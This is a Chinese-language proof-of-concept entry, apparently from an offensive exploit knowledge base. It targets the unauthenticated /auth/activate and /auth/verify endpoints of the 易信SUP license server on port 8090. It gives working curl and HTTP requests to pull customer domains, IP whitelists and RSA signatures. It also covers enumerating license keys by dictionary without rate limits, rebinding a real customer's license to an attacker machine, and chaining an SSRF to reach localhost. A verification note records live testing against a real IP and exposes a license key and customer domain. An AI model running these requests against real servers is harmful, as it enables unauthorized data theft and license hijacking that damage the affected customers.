# 易信SUP 授权服务器 :8090 /auth/activate 未授权返回授权码全量元数据（客户域名/IP白名单/套餐/到期/RSA签名）

- **code**: yixin-sup-auth-activate-unauth-license-metadata-oracle
- **kind**: poc
- **category**: info-leak
- **component**: 易信SUP（??Sup）内置授权服务器 /auth/activate + /auth/verify（Go 后端，:8090）
- **severity**: medium
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: task#616，2026-11-06 23:0x(UTC+8)，本机 Windows curl.exe 直连 149.104.30.75:8090（UA 伪装 Chrome/131）实测：① 无任何鉴权头 POST /auth/activate {"license_key":"YS-M85X-QC85-RQV5-RJQ8","machine_code":"2e90cf89791b827a","version":"1.0.44"} → HTTP 200 {"code":0,"data":{"plan":"standard","expire_at":1821489306,"domains":"pc.kuaishou.xin","ips":"","signature":"mupMnmzt8WTH5p/FraJ8Ep+q1bzKohs8...","issued_at":1793919993},"message":"ok"}；② 缺参对照 GET /auth/activate → 200 {"code":1,"message":"缺少 license_key"}（42B，证明 handler 存活、唯一入参就是 license_key，排除的是管理员会话而非参数校验）；③ 同族 GET /auth/verify?license_key=... 同样免鉴权可达。判定成立依据：零 Cookie/零 Authorization 头即拿到客户绑定域名与 RSA 签名，响应中无任何“未登录”类文案。
- **path**: pocs/yixin-sup-auth-activate-unauth-license-metadata-oracle/poc.http
- **tags**: info-leak,易信,sup,license,授权服务器,8090,auth-activate,auth-verify,未授权,授权码枚举,域名泄露,rsa签名,绑定改绑,礼品卡任务
- **created_at**: 2026-11-05T23:12:18.877Z
- **engine**: http://149.104.30.75:8090

## 描述

易信SUP 内置授权服务器（控制台同容器 127.0.0.1:8090，也可能随宿主机公网暴露）的 /auth/activate 与 /auth/verify 两个校验端点不做任何管理员鉴权，唯一入参就是 license_key，命中即返回该授权码的完整元数据：客户绑定域名(domains)、IP 白名单(ips)、套餐(plan)、到期时间(expire_at)、签发时间(issued_at) 与 RSA signature。既是数据泄露（客户资产与授权生命周期），又是 license_key 存在性 oracle；携带 machine_code 调用还会写库，可把该授权绑到攻击者机器上。前提只需 8090 可达 + 一个格式合法的 license_key（控制台流量、前端 JS、同族实例里都能捡到）。

## 用法

```
前置：8090 可达；持有一个 license_key（控制台激活流量里抓、或任意 5 段连字符格式串先试存在性）；不需要 admin token / Cookie。

1) 鉴权基线（先确认端点活着且只认 license_key）：
   curl -sS --noproxy '*' -i http://TARGET:8090/auth/activate
   期望 200 + {"code":1,"message":"缺少 license_key"}（若 401/跳登录页 → 该实例挂了前置鉴权，本条不成立）

2) 取元数据：
   curl -sS --noproxy '*' -i -X POST http://TARGET:8090/auth/activate \
     -H "Content-Type: application/json" \
     -d '{"license_key":"<KEY>","machine_code":"0123456789abcdef","version":"1.0.44"}'
   判据：200 且 body 为 {"code":0,"data":{"license_key":...,"plan":...,"expire_at":...,"domains":...,"ips":...,"signature":...},"message":"ok"}。
   data.domains 非空 = 该授权已绑定客户域名；data.ips 非空 = 存在 IP 白名单；signature 是 RSA 签名，可离线验签/复算。

3) 只读探存在性（不改绑定）：GET /auth/verify?license_key=<KEY> —— 同族免鉴权端点，可用来批量试 key 而不触发写。

4) 写侧（可选，会把 machine_code 绑到该授权，影响真实客户）：POST /auth/activate 带自己的 machine_code。控制台侧同步看 POST /api/console/Activate/GetStatus → data.activated/locked/plan/expire_at 回读确认。

5) 配合 SSRF 条目：若 8090 没对公网开，可经控制台 Activate/GoSystem 的 auth_server 参数打 127.0.0.1:8090（见 kb: 易信sup-后台-activate-gosystem-auth_server…）。

枚举加速：license_key 为 YS-XXXX-XXXX-XXXX-XXXX 形（4 组 4 位大写字母数字），单发 <100ms，无速率限制时可并发跑字典；命中 code=0 即有效。

失败常见原因：
- 回「缺少 license_key」：参数位置错（必须 JSON body，或 GET 用 query=license_key），不是鉴权拦。
- 回「授权码不存在 / 无效」：key 错或已吊销，换 key。
- 403「当前域名 xxx 不在该授权的许可范围内」：那是控制台 /api/console/Activate/GoSystem 的文案，说明验签过了；直连 8090 /auth/activate 一般不受域名限制。
- 连接超时：8090 只监听 127.0.0.1，走 SSRF 而非直连。
- 端口是 8080/8081 控制台而非授权服务器：控制台无 /auth/activate，会返回控制台 404/页面。
```

## 正文

```
# 易信SUP 授权服务器 /auth/activate 未授权泄露（info-leak）

## 0. 指纹
- 8090 端口，Go 后端，路径族固定 `/auth/*`。
- 发空 GET `/auth/activate` → `{"code":1,"message":"缺少 license_key"}` 即命中（响应短、JSON、无 HTML）。

## 1. 基线对照（先跑，排除“其实要登录”）
```http
GET /auth/activate HTTP/1.1
Host: <target>:8090
```
```http
HTTP/1.1 200 OK
{"code":1,"message":"缺少 license_key"}
```
零 Cookie 也是 200 → 端点无会话校验，唯一入参是 license_key。

## 2. 主利用：取授权码全量元数据
```http
POST /auth/activate HTTP/1.1
Host: <target>:8090
Content-Type: application/json

{"license_key":"<KEY>","machine_code":"0123456789abcdef","version":"1.0.44"}
```
实测回显（关键字段）：
```json
{"code":0,"data":{
  "license_key":"<KEY>",
  "machine_code":"0123456789abcdef",
  "plan":"standard",
  "expire_at":1821489306,
  "domains":"pc.<客户域名>",
  "ips":"",
  "signature":"mupMnmzt8WTH5p/FraJ8Ep+q1bzKohs8...",
  "issued_at":1793919993
},"message":"ok"}
```
- `domains` = 客户绑定域名（客户资产泄露）
- `ips` = IP 白名单（非空说明有网段限制，改绑前要看）
- `plan` / `expire_at` / `issued_at` = 套餐与授权生命周期
- `signature` = RSA 签名，可取回后离线验签

## 3. 只读存在性 oracle（不改绑定）
```http
GET /auth/verify?license_key=<KEY> HTTP/1.1
Host: <target>:8090
```
同族端点，同样只认 key，用于批量试探而不污染客户绑定。

## 4. 写侧副作用
`POST /auth/activate` 带 `machine_code` 会写库改绑。回读方式（控制台侧）：
```http
POST /api/console/Activate/GetStatus HTTP/1.1
Content-Type: application/json

{}
# -> data.activated / data.locked / data.plan / data.expire_at
```
若返回「当前域名 xxx 不在该授权的许可范围内」，只是控制台侧域名绑定告警，RSA 验签本身已过。

## 5. 8090 不对外时的打法
走控制台 `/api/console/Activate/GoSystem` 的 `auth_server` 参数把服务端指向 `http://127.0.0.1:8090`（1.0.44 用 JSON body，1.0.43 只认 query），详见同族 SSRF 条目。

## 6. license_key 格式与枚举
形如 `YS-XXXX-XXXX-XXXX-XXXX`（4 组 4 位大写字母/数字）。端点无鉴权、无速率限制、单发毫秒级 → 可并发跑字典，`code:0` 即有效。可行的 key 来源：控制台激活流量、前端 JS、同主机其它实例、webhook 回连捕获的 body。

## 7. 判定清单
成立需同时满足：
1. 空参数返回 `缺少 license_key`（handler 存活、非 401）；
2. 带合法 key 返回 `code:0` 且 data 含 domains/plan/signature；
3. 全程未发 Authorization / Cookie / 会话建立请求。

## 8. 常见失败原因
| 现象 | 原因 |
|---|---|
| 401 / 跳登录页 | 该实例给 /auth 挂了前置鉴权，本条不适用 |
| 「缺少 license_key」但带参仍同样回 | 参数位置错：必须 JSON body（或 GET 用 query） |
| 「授权码不存在/无效」 | key 错或已吊销 |
| 连接超时 | 8090 只监听 127.0.0.1，走 SSRF |
| 返回控制台 HTML/404 | 打的是 8080/8081 控制台端口，不是授权服务器 |

```
